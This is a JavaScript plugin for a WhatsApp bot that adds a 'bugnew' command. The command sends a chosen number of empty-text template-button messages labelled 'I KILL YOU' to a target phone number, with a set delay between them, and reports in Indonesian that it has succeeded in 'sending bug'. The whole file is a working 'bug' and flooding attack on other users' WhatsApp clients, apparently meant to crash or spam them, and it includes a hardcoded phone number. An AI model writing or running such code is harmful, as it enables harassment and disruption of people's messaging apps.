//DEV SHINCHAN

let handler = async (m, { conn, text, usedPrefix, command }) => {
    let ps = "I KILL YOU"
    let mm = text.split("|")[0]+'@s.whatsapp.net'
    let jm = text.split("|")[1]
    let time = text.split("|")[2]
    let poke = await m.reply(`Succes Mengirim Bug Ke ${mm} Sebanyak ${jm}`)
    for (let i = 0; i< jm ; i++) {
        await conn.sendMessage(mm, {
            text: '',
            templateButtons:[
                {callButton: {displayText: ps, phoneNumber: `6281546767920`}},
                {callButton: {displayText: ps, phoneNumber: `6281546767920`}},
                {urlButton: {displayText: "My Github", url: `https://github.com/Kanvret12`}},
                {quickReplyButton: {displayText: "Created by ShielD|Shinchan", id: `ShielD|Shinchan`}},
                {quickReplyButton: {displayText: "Created by ShielD|Shinchan", id: `ShielD|Shinchan`}},
                {quickReplyButton: {displayText: "Created by ShielD|Shinchan", id: `ShielD|Shinchan`}},
            ]
        })
        await sleep(60* time)
    }
}
handler.command = /^(bugnew)$/i

export default handler
